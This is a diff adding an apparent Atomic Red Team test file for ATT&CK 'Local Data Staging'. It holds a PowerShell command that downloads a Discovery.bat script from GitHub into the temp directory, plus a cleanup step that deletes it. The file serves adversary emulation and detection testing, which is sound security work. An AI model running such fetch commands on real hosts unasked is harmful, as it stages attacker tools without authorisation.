@@ -1,0 +1,12 @@
+#TechniqueName: Data Staged: Local Data Staging
+#AtomicTestName: Stage data from Discovery.bat
+#Description: Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,&verify that the file is saved in the temp directory.&
+#Language: ps1
+
+#commands
+Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile $env:TEMP\discovery.bat
+
+
+#cleanup_commands
+Remove-Item -Force $env:TEMP\discovery.bat -ErrorAction Ignore
+
